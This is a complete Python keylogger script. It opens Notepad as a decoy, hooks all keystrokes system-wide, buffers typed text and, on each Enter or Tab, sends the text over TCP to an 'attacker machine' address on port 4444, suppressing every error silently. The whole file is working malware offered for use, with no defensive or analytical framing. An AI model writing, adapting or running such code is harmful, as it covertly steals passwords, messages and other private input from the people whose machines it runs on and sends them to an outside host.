import subprocess
import socket
import keyboard
import time

# === CONFIG ===
KALI_IP = 'xxx.xxx.xx.xxx'  # Replace with your attacker machine IP
KALI_PORT = 4444

# === GLOBALS ===
buffer = ""
last_sent = ""
last_sent_time = 0

# === SEND TO KALI ===
def send_to_kali(data):
    global last_sent, last_sent_time
    now = time.time()

    if data == last_sent and (now - last_sent_time) < 2:
        return

    last_sent = data
    last_sent_time = now

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((KALI_IP, KALI_PORT))
            s.sendall(data.encode())
    except:
        pass  # Silent fail

# === KEY HANDLER ===
def on_key(e):
    global buffer
    if e.event_type != 'down':
        return

    key = e.name
    if key == 'space':
        buffer += ' '
    elif key in ['enter', 'tab']:
        if buffer.strip():
            send_to_kali(buffer.strip())
            buffer = ""
    elif key == 'backspace':
        buffer = buffer[:-1]
    elif len(key) == 1:
        buffer += key

# === MAIN ===
def main():
    try:
        subprocess.Popen(["notepad.exe"])
    except:
        pass  # Decoy fail silently

    keyboard.unhook_all()
    keyboard.hook(on_key)
    keyboard.wait('esc')  # Stop with ESC key

if __name__ == "__main__":
    main()
